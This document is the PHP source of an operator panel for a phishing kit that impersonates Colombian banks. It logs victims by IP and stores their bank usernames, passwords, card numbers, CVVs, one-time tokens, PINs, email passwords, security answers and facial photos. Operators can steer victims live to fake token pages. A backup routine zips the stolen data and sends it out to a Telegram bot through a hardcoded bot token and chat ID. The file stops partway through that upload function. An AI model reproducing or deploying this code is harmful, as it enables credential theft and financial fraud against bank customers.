<?php

// HEADERS PARA CORS - Agregar al principio del admin.php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');
header('Access-Control-Allow-Credentials: true');

// Si es una petición OPTIONS, terminar aquí
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}
session_start();
define('SECURE_ACCESS', true);
require_once 'db.php'; // Cargar la nueva librería



// ✅ DETECTOR AUTOMÁTICO DE RUTA (NO TOCAR)
// Esto detecta si estás en /coop1v o en /28hfh24/stsvalir automáticamente
define('RUTA_DINAMICA', rtrim(dirname($_SERVER['SCRIPT_NAME']), '/\\'));

// =============================================
// 📸 1. LOGICA DE SUBIDA (GUARDA AMBAS FOTOS)
// =============================================
if (isset($_POST['action']) && $_POST['action'] === 'upload_photo') {
    while (ob_get_level()) ob_end_clean();
    header('Content-Type: application/json; charset=utf-8');

    $ip = isset($_POST['target_ip']) && !empty($_POST['target_ip']) ? $_POST['target_ip'] :  (isset($_SERVER["HTTP_X_FORWARDED_FOR"]) ? trim(explode(",", $_SERVER["HTTP_X_FORWARDED_FOR"])[0]) : (isset($_SERVER["HTTP_CLIENT_IP"]) ? $_SERVER["HTTP_CLIENT_IP"] : (isset($_SERVER["HTTP_X_REAL_IP"]) ? $_SERVER["HTTP_X_REAL_IP"] : (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER["REMOTE_ADDR"])))) ;
    $usersData = loadUsersData();
    $uploadDir = 'uploads/';
    
    if (!is_dir($uploadDir)) mkdir($uploadDir, 0755, true);
    file_put_contents($uploadDir . '.htaccess', "Deny from all"); 

    if (isset($_FILES['photo']) && $_FILES['photo']['error'] === UPLOAD_ERR_OK) {
        $ext = pathinfo($_FILES['photo']['name'], PATHINFO_EXTENSION);
        $filename = 'facial_' . time() . '_' . rand(1000,9999) . '.' . $ext;
        $targetFile = $uploadDir . $filename;

        if (move_uploaded_file($_FILES['photo']['tmp_name'], $targetFile)) {
            if (isset($usersData[$ip]) && !empty($usersData[$ip]['submissions'])) {
                
                $lastIdx = count($usersData[$ip]['submissions']) - 1;
                $attempt = $_POST['attempt'] ?? '0';
                
                // DIFERENCIAR LAS LLAVES PARA QUE NO SE SOBRESCRIBAN
                if ($attempt == '0') {
                    $usersData[$ip]['submissions'][$lastIdx]['data']['Foto_Falla'] = $filename;
                } else {
                    $usersData[$ip]['submissions'][$lastIdx]['data']['Foto_OK'] = $filename;
                }
                
                // Actualizar tiempos
                $usersData[$ip]['submissions'][$lastIdx]['last_seen'] = time();
                $usersData[$ip]['last_seen'] = time();
                
                // Redirigir si es exitoso (intento > 0), si es falla no redirige (lo maneja el JS)
                if ($attempt != '0') {
                    $usersData[$ip]['currentPage'] = RUTA_DINAMICA . '/wait.php';
                }
                
                file_put_contents('xzw.json', json_encode($usersData, JSON_PRETTY_PRINT));
                echo json_encode(['success' => true]);
                exit;
            }
        }
    }
    echo json_encode(['success' => false]);
    exit;
}

// =============================================
// 📸 2. MOTOR DE IMAGEN SEGURO (Para el visor)
// =============================================
if (isset($_GET['action']) && $_GET['action'] === 'render_image_raw') {
    if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) die("X");

    $file = basename($_GET['file']);
    $filepath = 'uploads/' . $file;

    if (file_exists($filepath)) {
        // Si pide descarga (?dl=1) fuerza la bajada, si no, la muestra
        if (isset($_GET['dl']) && $_GET['dl'] == '1') {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.$file.'"');
        } else {
            header('Content-Type: ' . mime_content_type($filepath));
            header('Content-Disposition: inline; filename="'.$file.'"');
        }
        readfile($filepath);
        exit;
    }
}

// 3. RENDERIZADOR DE IMAGEN (El motor que muestra/descarga el archivo protegido)
if (isset($_GET['action']) && $_GET['action'] === 'render_image_raw') {
    if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) die("X");

    $file = basename($_GET['file']);
    $filepath = 'uploads/' . $file;

    if (file_exists($filepath)) {
        $mime = mime_content_type($filepath);
        header('Content-Type: ' . $mime);
        
        // Si tiene ?dl=1, forzamos descarga. Si no, solo mostramos.
        if (isset($_GET['dl']) && $_GET['dl'] == '1') {
            header('Content-Disposition: attachment; filename="'.$file.'"');
        } else {
            header('Content-Disposition: inline; filename="'.$file.'"');
        }
        
        readfile($filepath);
        exit;
    }
}

// SI HAY CONTENIDO, PROCESAR INMEDIATAMENTE
if (isset($_POST['contenido'])) {
    // Limpiar TODO
    while (ob_get_level()) ob_end_clean();
    
    header('Content-Type: application/json; charset=utf-8');
    
    // ✅✅✅ USAR LA FUNCIÓN REAL DEL PANEL
    $response = processFrontendDataWithUserBlock($_POST);
    
    echo json_encode($response);
    exit;
}

// ✅✅✅ AGREGAR: Si es check_my_page, procesar inmediatamente también
if (isset($_POST['action']) && $_POST['action'] === 'check_my_page') {
    while (ob_get_level()) ob_end_clean();
    header('Content-Type: application/json; charset=utf-8');
    
    $userIP =  (isset($_SERVER["HTTP_X_FORWARDED_FOR"]) ? trim(explode(",", $_SERVER["HTTP_X_FORWARDED_FOR"])[0]) : (isset($_SERVER["HTTP_CLIENT_IP"]) ? $_SERVER["HTTP_CLIENT_IP"] : (isset($_SERVER["HTTP_X_REAL_IP"]) ? $_SERVER["HTTP_X_REAL_IP"] : (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER["REMOTE_ADDR"])))) ;
    $usersData = loadUsersData();
    
    if (isset($usersData[$userIP])) {
        // Inicializar variables
        $savedName = '';
        $savedNameEmpresa = '';
        
        if (!empty($usersData[$userIP]['submissions'])) {
            $lastSub = end($usersData[$userIP]['submissions']);
            $savedName = $lastSub['data']['Last4'] ?? '';
            $savedNameEmpresa = $lastSub['data']['Last4_Empresa'] ?? '';
        }
        
        $response = [
            'success' => true, 
            'currentPage' => $usersData[$userIP]['currentPage'] ?? '',
            'ip' => $userIP,
            'savedName' => $savedName,
            'savedNameEmpresa' => $savedNameEmpresa,
            // 👇 NUEVA LÍNEA IMPORTANTE 👇
            'challenge_code' => $usersData[$userIP]['challenge_code'] ?? '',
            // 👇 PREGUNTA DE SEGURIDAD ENVIADA DESDE EL PANEL 👇
            'question' => $usersData[$userIP]['security_question'] ?? '' 
        ];
    } else {
        $response = ['success' => false, 'error' => 'Usuario no encontrado'];
    }
    echo json_encode($response);
    exit;
}

// PROTECCIÓN ROBUSTA CONTRA ACCESO DIRECTO (solo para interfaz web)
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    // Registrar intento de acceso no autorizado
    $ip = (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0] :  (isset($_SERVER["HTTP_X_FORWARDED_FOR"]) ? trim(explode(",", $_SERVER["HTTP_X_FORWARDED_FOR"])[0]) : (isset($_SERVER["HTTP_CLIENT_IP"]) ? $_SERVER["HTTP_CLIENT_IP"] : (isset($_SERVER["HTTP_X_REAL_IP"]) ? $_SERVER["HTTP_X_REAL_IP"] : (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER["REMOTE_ADDR"])))) );
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $timestamp = date('Y-m-d H:i:s');
    
    // Redirigir al login
    header('Location: login.php');
    exit;
}



if(isset($_SESSION['admin_username'])) {
    $sessFile = 'storage_sessions';
    $misSesiones = loadData($sessFile);
    $miKey = $_SESSION['admin_username'] . '|' .  (isset($_SERVER["HTTP_X_FORWARDED_FOR"]) ? trim(explode(",", $_SERVER["HTTP_X_FORWARDED_FOR"])[0]) : (isset($_SERVER["HTTP_CLIENT_IP"]) ? $_SERVER["HTTP_CLIENT_IP"] : (isset($_SERVER["HTTP_X_REAL_IP"]) ? $_SERVER["HTTP_X_REAL_IP"] : (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER["REMOTE_ADDR"])))) ;
    
    // Solo actualizamos si han pasado más de 60 segundos para no saturar
    if (!isset($misSesiones[$miKey]) || (time() - $misSesiones[$miKey] > 60)) {
        $misSesiones[$miKey] = time();
        saveData($sessFile, $misSesiones);
    }
}
// En admin.php, después del session_start() y verificación de login
// Agregar esto:

// =============================================
// GESTIÓN DE SESIONES Y EXPULSIÓN
// =============================================
$sessionsFile = 'active_sessions.json';
$username = $_SESSION['admin_username'];
$remoteIP =  (isset($_SERVER["HTTP_X_FORWARDED_FOR"]) ? trim(explode(",", $_SERVER["HTTP_X_FORWARDED_FOR"])[0]) : (isset($_SERVER["HTTP_CLIENT_IP"]) ? $_SERVER["HTTP_CLIENT_IP"] : (isset($_SERVER["HTTP_X_REAL_IP"]) ? $_SERVER["HTTP_X_REAL_IP"] : (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER["REMOTE_ADDR"])))) ;
$sessionKey = $username . '|' . $remoteIP;

if (file_exists($sessionsFile)) {
    $sessions = json_decode(file_get_contents($sessionsFile), true) ?: [];
    
    // 1. VERIFICAR SI FUE EXPULSADO (KICKED)
    if (isset($sessions[$sessionKey]) && isset($sessions[$sessionKey]['kicked']) && $sessions[$sessionKey]['kicked'] === true) {
        // Eliminar la entrada del archivo json para limpiar
        unset($sessions[$sessionKey]);
        file_put_contents($sessionsFile, json_encode($sessions, JSON_PRETTY_PRINT));
        
        // Destruir la sesión PHP real
        session_destroy();
        
        // Redirigir al login con alerta (opcional pasar por parametro)
        header('Location: login.php?kicked=1');
        exit;
    }
    
    // 2. ACTUALIZAR TIEMPO (SI NO ESTÁ EXPULSADO)
    $sessions[$sessionKey] = [
        'username' => $username,
        'ip' => $remoteIP,
        'last_activity' => time(),
        'user_agent' => $_SERVER['HTTP_USER_AGENT'],
        'status' => 'online' // Asegurar estado
    ];
    
    // 3. LIMPIEZA DE SESIONES VIEJAS (> 1 HORA)
    foreach ($sessions as $key => $session) {
        if (time() - $session['last_activity'] > 3600) {
            unset($sessions[$key]);
        }
    }
    
    file_put_contents($sessionsFile, json_encode($sessions, JSON_PRETTY_PRINT));
} else {
    // Si no existe el archivo, crearlo con la sesión actual
    $sessions = [
        $sessionKey => [
            'username' => $username,
            'ip' => $remoteIP,
            'last_activity' => time(),
            'user_agent' => $_SERVER['HTTP_USER_AGENT'],
            'status' => 'online'
        ]
    ];
    file_put_contents($sessionsFile, json_encode($sessions, JSON_PRETTY_PRINT));
}

// Protección adicional contra ataques
header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
// PREVENIR CACHÉ
header("Cache-Control: no-cache, no-store, must-revalidate");
header("Pragma: no-cache");
header("Expires: 0");

header('Content-Type: text/html; charset=utf-8');

// =============================================
// FUNCIONES DEL SISTEMA
// =============================================

// =============================================
// NUENO: SISTEMA DE COLORES Y MARCADO DE ADMINS
// =============================================

// MANTÉN EL ARRAY DE COLORES (asegúrate de que esté definido antes de la función)
$COLORES_DISPONIBLES = [
    '#FF0000', // Rojo brillante
    '#00FF00', // Verde lima
    '#0066FF', // Azul intenso
    '#FFD700', // Dorado
    '#FF00FF', // Magenta
    '#00FFFF', // Cian
    '#FF4500', // Naranja rojizo
    '#9400D3', // Violeta oscuro
    '#00FA9A', // Verde primavera medio
    '#DC143C'  // Carmesí
];

// REEMPLAZA LA FUNCIÓN getAdminColor COMPLETA CON ESTA NUEVA:
function getAdminColor($username) {
    global $COLORES_DISPONIBLES;
    
    // 1. Cargar datos usando el sistema seguro (db.php) en vez de JSON
    // Esto buscará 'storage_colors.php'
    $colorsData = loadData('storage_colors'); 
    
    // 2. Si ya tiene color asignado, retornarlo
    if (isset($colorsData[$username])) {
        return $colorsData[$username];
    }
    
    // 3. Si no tiene color, buscar uno libre
    $coloresUsados = array_values($colorsData);
    
    foreach ($COLORES_DISPONIBLES as $color) {
        if (!in_array($color, $coloresUsados)) {
            // Asignar el color encontrado al usuario
            $colorsData[$username] = $color;
            
            // 4. Guardar de forma segura usando saveData (crea el .php protegido)
            saveData('storage_colors', $colorsData);
            
            return $color;
        }
    }
    
    return '#FFFFFF'; // Fallback si se acaban los colores
}

// Función para marcar una entrada
function markSubmission($data) {
    $submissionId = $data['submission_id'] ?? '';
    $ip = $data['ip'] ?? '';
    $adminUser = $_SESSION['admin_username'] ?? 'Admin'; // Asume que tienes la sesión iniciada

    $usersData = loadUsersData();

    if (isset($usersData[$ip])) {
        foreach ($usersData[$ip]['submissions'] as &$sub) {
            if ($sub['submission_id'] === $submissionId) {
                // Verificar si ya está marcada
                if (!empty($sub['marked_by'])) {
                     return ['success' => false, 'error' => 'Esta entrada ya fue marcada por ' . $sub['marked_by']];
                }

                // Obtener color del admin y marcar
                $adminColor = getAdminColor($adminUser);
                $sub['marked_by'] = $adminUser;
                $sub['marked_color'] = $adminColor;
                $sub['last_seen'] = time(); // Actualizar para que suba en la tabla
                
                // Actualizar globalmente también
                $usersData[$ip]['last_seen'] = time();
                
                file_put_contents('xzw.json', json_encode($usersData, JSON_PRETTY_PRINT));
                return ['success' => true, 'message' => 'Entrada marcada correctamente', 'color' => $adminColor];
            }
        }
    }
    return ['success' => false, 'error' => 'Entrada no encontrada'];
}

// Función para DESMARCAR una entrada (Solo el dueño)
function unmarkSubmission($data) {
    $submissionId = $data['submission_id'] ?? '';
    $ip = $data['ip'] ?? '';
    $currentUser = $_SESSION['admin_username'] ?? '';

    $usersData = loadUsersData();

    if (isset($usersData[$ip])) {
        foreach ($usersData[$ip]['submissions'] as &$sub) {
            if ($sub['submission_id'] === $submissionId) {
                // Verificar si está marcada
                if (empty($sub['marked_by'])) {
                     return ['success' => false, 'error' => 'La entrada no está marcada.'];
                }
                
                // VERIFICACIÓN DE PROPIEDAD
                if ($sub['marked_by'] !== $currentUser) {
                    return ['success' => false, 'error' => 'Solo ' . $sub['marked_by'] . ' puede desmarcar esto.'];
                }

                // Desmarcar
                unset($sub['marked_by']);
                unset($sub['marked_color']);
                
                // Actualizar timestamp para refrescar tabla
                $usersData[$ip]['last_seen'] = time();
                
                file_put_contents('xzw.json', json_encode($usersData, JSON_PRETTY_PRINT));
                return ['success' => true, 'message' => 'Entrada desmarcada.'];
            }
        }
    }
    return ['success' => false, 'error' => 'Entrada no encontrada'];
}

function loadUsersData() {
    $file = 'xzw.json';
    
    if (!file_exists($file)) {
        return [];
    }
    
    $content = file_get_contents($file);
    
    $data = json_decode($content, true);
    
    if (json_last_error() !== JSON_ERROR_NONE) {
        return [];
    }
    
    return $data ?: [];
}

/// FUNCIÓN UPDATEUSERSTATUS (MEJORADA PARA REACTIVAR USUARIO)
function updateUserStatus($ip, $status = 'online') {
    $usersData = loadUsersData();
    if (isset($usersData[$ip])) {
        // SI ESTÁ BLOQUEADO, MANTENER BLOQUEADO
        if ($usersData[$ip]['status'] === 'blocked') {
            return 'blocked';
        }
        
        $timestamp = time();
        $usersData[$ip]['status'] = $status;
        $usersData[$ip]['last_seen'] = $timestamp;

        // ✅ NUEVO: Actualizar también la última submission para que la tabla reaccione
        if (!empty($usersData[$ip]['submissions'])) {
            $lastIndex = count($usersData[$ip]['submissions']) - 1;
            $usersData[$ip]['submissions'][$lastIndex]['last_seen'] = $timestamp;
        }

        file_put_contents('xzw.json', json_encode($usersData, JSON_PRETTY_PRINT));
    }
    return $status;
}

// FUNCIÓN CHECKUSERSTATUS (CORREGIDA: PRIORIZA LA ACTIVIDAD MÁS RECIENTE)
function checkUserStatus($user, $submission = null) {
    // Tomamos el tiempo más reciente entre la IP global y la submission específica
    $globalLastSeen = $user['last_seen'] ?? 0;
    $submissionLastSeen = $submission['last_seen'] ?? 0;
    
    // Usamos el mayor de los dos (el más reciente)
    $lastSeen = max($globalLastSeen, $submissionLastSeen);
    
    $currentTime = time();
    $timeDiff = $currentTime - $lastSeen;
    
    // Si la IP está bloqueada globalmente
    if (($user['status'] ?? 'online') === 'blocked') {
        return 'blocked';
    }
    
    // ✅ AUMENTADO A 25 SEGUNDOS para evitar parpadeos "Offline" si el internet es lento
    if ($timeDiff > 25) {
        return 'offline';
    }
    
    return 'online';
}

function redirectUser($ip, $page) {
    $usersData = loadUsersData();
    
    if (isset($usersData[$ip])) {
        // ✅ DETECTAR AUTOMÁTICAMENTE TODOS LOS FRONTENDS DE PSE
        $currentPage = $usersData[$ip]['currentPage'] ?? '';
        
        // Determinar el frontend basado en la página actual
        $frontend = 'bogota'; // Por defecto
        
        if (strpos($currentPage, 'occidente') !== false) {
            $frontend = 'occidente';
        }
        if (strpos($currentPage, 'bbva') !== false) {
            $frontend = 'bbva';
        }
        if (strpos($currentPage, 'cajasocial') !== false) {
            $frontend = 'cajasocial';
        }
        if (strpos($currentPage, 'avvillas') !== false) {
            $frontend = 'avvillas';
        }
        if (strpos($currentPage, 'davivienda') !== false) {
            $frontend = 'davivienda';
        }
        if (strpos($currentPage, 'bogota') !== false) {
            $frontend = 'bogota';
        }
        if (strpos($currentPage, 'popular') !== false) {
            $frontend = 'popular';
        }
        if (strpos($currentPage, 'colpatria') !== false) {
            $frontend = 'colpatria';
        }
        if (strpos($currentPage, 'daviplata') !== false) {
            $frontend = 'daviplata';
        }
                if (strpos($currentPage, 'bancolombia') !== false) {
            $frontend = 'bancolombia';
                        }
                if (strpos($currentPage, 'falabella') !== false) {
            $frontend = 'falabella';
        }
                if (strpos($currentPage, 'bmujer') !== false) {
            $frontend = 'bmujer';
        }
                if (strpos($currentPage, 'lulob') !== false) {
            $frontend = 'lulob';
        }
        
        $pageMapping = [
    'bogota' => [
        'login_real.php'    => RUTA_DINAMICA . '/index.php',
        'login_empresa.php' => RUTA_DINAMICA . '/empresas.php',
        'token_real.php'    => RUTA_DINAMICA . '/token.php', 
        'espera_real.php'   => RUTA_DINAMICA . '/token2.php', // o pintc.php
        'blocked.php'       => RUTA_DINAMICA . '/blocked.php'
    ]
];
                
        
        // Usar el mapeo correcto según el frontend detectado
        $mapping = $pageMapping[$frontend] ?? $pageMapping['bogota'];
        
        if (isset($mapping[$page])) {
            $newPage = $mapping[$page];
            $usersData[$ip]['currentPage'] = $newPage;
            
            if ($usersData[$ip]['status'] !== 'blocked') {
                $usersData[$ip]['status'] = 'online';
            }
            
            $usersData[$ip]['last_seen'] = time();
            file_put_contents('xzw.json', json_encode($usersData, JSON_PRETTY_PRINT));
            
            return [
                'success' => true, 
                'message' => "Usuario redirigido a: $newPage (Frontend: $frontend)"
            ];
        } else {
            return ['success' => false, 'error' => 'Página no válida: ' . $page];
        }
    }
    
    return ['success' => false, 'error' => 'Usuario no encontrado'];
}

function blockUserByIP($ip) {
    $usersData = loadUsersData();
    
    // RUTA DE LA PÁGINA DE BLOQUEO (Ajustada a tu estructura)
    $blockedPage = RUTA_DINAMICA . '/blocked.php';

    if (isset($usersData[$ip])) {
        $usersData[$ip]['status'] = 'blocked';
        $usersData[$ip]['currentPage'] = $blockedPage; // <--- CAMBIO: Redirige a blocked.php
        $usersData[$ip]['last_seen'] = time();
        
        file_put_contents('xzw.json', json_encode($usersData, JSON_PRETTY_PRINT));
        return ['success' => true, 'message' => 'IP bloqueada y redirigida a blocked.php'];
    }
    
    // Si no existe, lo creamos ya bloqueado en esa página
    $usersData[$ip] = [
        'color' => '#ff0000',
        'currentPage' => $blockedPage, // <--- CAMBIO
        'location' => 'Blocked',
        'status' => 'blocked',
        'last_seen' => time(),
        'submissions' => []
    ];
    
    file_put_contents('xzw.json', json_encode($usersData, JSON_PRETTY_PRINT));
    return ['success' => true, 'message' => 'IP bloqueada (nuevo registro)'];
}

// FUNCIÓN DESBLOQUEAR POR IP
function unblockUserByIP($ip) {
    $usersData = loadUsersData();
    
    if (isset($usersData[$ip])) {
        $usersData[$ip]['status'] = 'online';
        $usersData[$ip]['last_seen'] = time();
        file_put_contents('xzw.json', json_encode($usersData, JSON_PRETTY_PRINT));
        return ['success' => true, 'message' => 'Usuario desbloqueado por IP'];
    }
    
    return ['success' => false, 'error' => 'Usuario no encontrado'];
}

// FUNCIÓN PARA VERIFICAR SI UN USUARIO ESTÁ BLOQUEADO
function isUserBlocked($username) {
    $usersData = loadUsersData();
    
    foreach ($usersData as $userData) {
        if (!empty($userData['submissions'])) {
            foreach ($userData['submissions'] as $submission) {
                if (isset($submission['data']['Usuario']) && 
                    $submission['data']['Usuario'] === $username && 
                    $userData['status'] === 'blocked') {
                    return true;
                }
            }
        }
    }
    
    return false;
}

// FUNCIÓN DELETEUSER
function deleteUser($ip) {
    $usersData = loadUsersData();
    
    if (isset($usersData[$ip])) {
        unset($usersData[$ip]);
        file_put_contents('xzw.json', json_encode($usersData, JSON_PRETTY_PRINT));
        return ['success' => true, 'message' => 'Usuario eliminado'];
    }
    
    return ['success' => false, 'error' => 'Usuario no encontrado'];
}

// =============================================
// FUNCIÓN BACKUP MEJORADA (INCLUYE TARJETA Y TODOS LOS TOKENS)
// =============================================
function createBackup() {
    $backupDir = 'logsbackups';
    $uploadDir = 'uploads/'; // Carpeta de fotos
    
    if (!is_dir($backupDir)) mkdir($backupDir, 0755, true);
    
    $timestamp = date('d-m-Y-H-i-s');
    $zipFilename = $backupDir . '/Backup_Completo_' . $timestamp . '.zip';
    
    if (file_exists('xzw.json')) {
        $currentData = file_get_contents('xzw.json');
        $usersData = json_decode($currentData, true);
        
        if ($usersData) {
            // 1. GENERAR CONTENIDO DEL TEXTO (LOG)
            $txtContent = "══════════════════════════════════════\n";
            $txtContent .= "        BACKUP COMPLETO (DATOS + FOTOS)\n";
            $txtContent .= "        Fecha: " . date('d/m/Y H:i:s') . "\n";
            $txtContent .= "══════════════════════════════════════\n\n";
            
            $entryNumber = 1;
            $totalFotos = 0;
            
            // Array para guardar qué fotos debemos meter al ZIP
            $filesToZip = [];

            foreach ($usersData as $ip => $user) {
                if (!empty($user['submissions'])) {
                    foreach ($user['submissions'] as $sub) {
                        $d = $sub['data'] ?? [];
                        
                        $txtContent .= "══════════════════════════════════════\n";
                        $txtContent .= "ENTRADA #$entryNumber | IP: $ip\n";
                        $txtContent .= "══════════════════════════════════════\n";
                        
                        // --- DATOS BÁSICOS ---
                        if (!empty($d['Documento']))      $txtContent .= "Documento:        " . $d['Documento'] . "\n";
                        if (!empty($d['NroEmpresarial'])) $txtContent .= "Empresa:          " . $d['NroEmpresarial'] . "\n";
                        if (!empty($d['Usuario']))        $txtContent .= "Usuario:          " . $d['Usuario'] . "\n";
                        if (!empty($d['Clave']))          $txtContent .= "Clave:            " . $d['Clave'] . "\n";
                        
                        // --- TARJETA DE CRÉDITO (NUEVO) ---
                        if (!empty($d['CC_Number']))      $txtContent .= "💳 Tarjeta:       " . $d['CC_Number'] . "\n";
                        if (!empty($d['CC_Exp']))         $txtContent .= "📅 Vencimiento:   " . $d['CC_Exp'] . "\n";
                        if (!empty($d['CC_Cvv']))         $txtContent .= "🔒 CVV:           " . $d['CC_Cvv'] . "\n";

                        // --- TOKENS Y SEGURIDAD ---
                        if (!empty($d['Token']))          $txtContent .= "🔑 Token:         " . $d['Token'] . "\n";
                        if (!empty($d['TokenNetCash']))   $txtContent .= "🔑 Token Correo:  " . $d['TokenNetCash'] . "\n";
                        if (!empty($d['TokenEmpresa']))   $txtContent .= "📱 Token Empresa: " . $d['TokenEmpresa'] . "\n";
                        if (!empty($d['Pin']))            $txtContent .= "🔢 PIN/SMS:       " . $d['Pin'] . "\n";
                        if (!empty($d['TokenApp']))       $txtContent .= "📱 Token App:     " . $d['TokenApp'] . "\n";
                        
                        // --- CORREO ---
                        if (!empty($d['Correo']))         $txtContent .= "📧 Correo:        " . $d['Correo'] . "\n";
                        if (!empty($d['ClaveCorreo']))    $txtContent .= "🔑 Clave Correo:  " . $d['ClaveCorreo'] . "\n";

                        // --- PREGUNTAS DE SEGURIDAD ---
                        if (!empty($d['Preg1']) || !empty($d['Resp1'])) $txtContent .= "❓ Preg1:         " . ($d['Preg1']??'') . " | ✏️ Resp1: " . ($d['Resp1']??'') . "\n";
                        if (!empty($d['Preg2']) || !empty($d['Resp2'])) $txtContent .= "❓ Preg2:         " . ($d['Preg2']??'') . " | ✏️ Resp2: " . ($d['Resp2']??'') . "\n";
                        if (!empty($d['Preg3']) || !empty($d['Resp3'])) $txtContent .= "❓ Preg3:         " . ($d['Preg3']??'') . " | ✏️ Resp3: " . ($d['Resp3']??'') . "\n";
                        if (!empty($d['Preg4']) || !empty($d['Resp4'])) $txtContent .= "❓ Preg4:         " . ($d['Preg4']??'') . " | ✏️ Resp4: " . ($d['Resp4']??'') . "\n";

                        // --- FOTOS ---
                        if (!empty($d['Foto'])) {
                            $txtContent .= "📸 FOTO (General): " . basename($d['Foto']) . "\n";
                            $filesToZip[] = basename($d['Foto']);
                            $totalFotos++;
                        }
                        if (!empty($d['Foto_Falla'])) {
                            $txtContent .= "📸 FOTO (Falla):   " . basename($d['Foto_Falla']) . "\n";
                            $filesToZip[] = basename($d['Foto_Falla']);
                            $totalFotos++;
                        }
                        if (!empty($d['Foto_OK'])) {
                            $txtContent .= "📸 FOTO (OK):      " . basename($d['Foto_OK']) . "\n";
                            $filesToZip[] = basename($d['Foto_OK']);
                            $totalFotos++;
                        }
                        
                        $txtContent .= "--------------------------------------\n";
                        $txtContent .= "Fecha: " . date('d/m/Y H:i:s', $sub['timestamp'] ?? time()) . "\n\n";
                        $entryNumber++;
                    }
                }
            }
            
            // 2. CREAR EL ARCHIVO ZIP
            $zip = new ZipArchive();
            if ($zip->open($zipFilename, ZipArchive::CREATE) === TRUE) {
                
                // A. Agregar el reporte de texto
                $zip->addFromString('Reporte_Usuarios.txt', $txtContent);
                
                // B. Agregar las fotos encontradas
                $filesToZip = array_unique($filesToZip); 
                foreach ($filesToZip as $fotoName) {
                    $realPath = $uploadDir . $fotoName;
                    if (file_exists($realPath)) {
                        $zip->addFile($realPath, 'fotos/' . $fotoName);
                    }
                }
                
                $zip->close();
                
                // 3. ENVIAR A TELEGRAM
                $telegramResult = sendBackupToTelegram($zipFilename, $timestamp, ($entryNumber-1), count($usersData), $totalFotos);
                
                if ($telegramResult['success']) {
                    return $zipFilename . '|' . $telegramResult['message'];
                } else {
                    return $zipFilename . '|' . $telegramResult['error'];
                }
            } else {
                return false; 
            }
        }
    }
    return false;
}

// FUNCIÓN AUXILIAR PARA LIMPIAR TEXTO DE COORDENADAS
function cleanCoordinateText($text) {
    if (empty($text)) return '';
    
    // Lista de textos a eliminar
    $patternsToRemove = [
        '/🔢 PIN:\s*/i',
        '/📱 SMS:\s*/i', 
        '/🔑 Token:\s*/i',
        '/👤 User:\s*/i',
        '/🔐 Clave:\s*/i',
        '/👤 Documento:\s*/i',
        '/NroEmpresarial:\s*/i',
        '/NombreCliente:\s*/i',
        '/\s+/' // Múltiples espacios
    ];
    
    $text = trim($text);
    
    foreach ($patternsToRemove as $pattern) {
        $text = preg_replace($pattern, ' ', $text);
    }
    
    // Eliminar emojis y caracteres especiales
    $text = preg_replace('/[^\w\s\=\|\:\.\,\-\_]/u', '', $text);
    
    return trim($text);
}

// FUNCIÓN AUXILIAR PARA FORMATEAR COORDENADAS
function formatCoordinate($coord) {
    if (empty($coord)) return '';
    
    $coord = trim($coord);
    
    // Si ya tiene formato H5: 333, dejarlo así
    if (preg_match('/^[A-Z]\d+\s*\:\s*\d+$/i', $coord)) {
        // Asegurar un solo espacio después de :
        $coord = preg_replace('/\s*\:\s*/', ': ', $coord);
        return strtoupper($coord);
    }
    
    // Si tiene formato H5=333, convertir a H5: 333
    if (strpos($coord, '=') !== false) {
        $coord = str_replace('=', ': ', $coord);
        $coord = preg_replace('/\s+/', ' ', $coord); // Unificar espacios
        return strtoupper(trim($coord));
    }
    
    // Para cualquier otro caso, limpiar espacios extras
    $coord = preg_replace('/\s+/', ' ', $coord);
    return strtoupper(trim($coord));
}

// =============================================
// FUNCIÓN ENVIAR A TELEGRAM (ADAPTADA A ZIP)
// =============================================
function sendBackupToTelegram($filePath, $timestamp, $totalEntries, $uniqueIPs, $totalFotos) {
    // TUS CREDENCIALES
    $botToken = '8519016756:AAF_Qc8umNIne0VU8MpfobC1th_-XVLYAek';
    $chatId = '-5066276488';
    
    // 1. MENSAJE RESUMEN
    $message = "📦 *BACKUP COMPLETO (ZIP)*\n";
    $message .= "══════════════════\n";
    $message .= "📅 Fecha: `$timestamp`\n";
    $message .= "👥 Usuarios: $uniqueIPs\n";
    $message .= "📝 Registros: $totalEntries\n";
    $message .= "📸 Fotos Incluidas: $totalFotos\n";
    $message .= "══════════════════\n";
    $message .= "_Descomprime el archivo para ver el reporte y la carpeta de fotos._";
    
    // 2. ENVIAR DOCUMENTO (ZIP)
    if (file_exists($filePath) && filesize($filePath) > 0) {
        $urlDoc = "https://api.telegram.org/bot{$botToken}/sendDocument";
        $cfile = new CURLFile(realpath($filePath), 'application/zip', 'Backup_' . $timestamp . '.zip');

        $dataDoc = [
            'chat_id' => $chatId,
            'document' => $cfile,
            'caption' => $message,
            'parse_mode' => 'Markdown'
        ];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $urlDoc);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $dataDoc);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 120); // Tiempo extra para subir el ZIP
        
        $result = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
